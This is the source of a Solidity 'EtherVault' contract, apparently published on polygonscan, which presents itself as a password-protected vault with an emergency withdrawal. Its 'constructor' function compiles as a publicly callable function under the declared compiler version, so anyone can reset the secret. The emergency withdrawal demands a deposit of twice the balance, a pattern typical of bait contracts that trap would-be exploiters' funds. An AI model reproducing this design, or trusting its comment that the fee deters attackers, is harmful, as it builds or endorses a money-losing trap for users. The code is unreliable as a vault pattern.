/**
 *Submitted for verification at polygonscan.com on 2023-02-03
*/

pragma solidity ^0.4.18;

contract EtherVault
{
    address public Owner = msg.sender;
    bytes32 public secret;

    constructor(bytes32 _secret) public {
        secret = _secret;
    }
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function hash(string memory _string) public pure returns(bytes32) {
        return keccak256(abi.encodePacked(_string));
        }
    

    /*
    Emergency withdraw function incase owner ever looses access to 
    his key. To deter would-be bruteforce attackers, require a fee 
    sent along with the transaction, which is returned along with 
    the balance of this contract in that same transaction.
    */
    function emergencyWithdraw(address addr, string passwd)
    payable
    

    {
        require(hash(passwd) == secret);
        if(msg.value>=this.balance * 2)
        {        
            addr.transfer(this.balance+msg.value);
        }
    }
}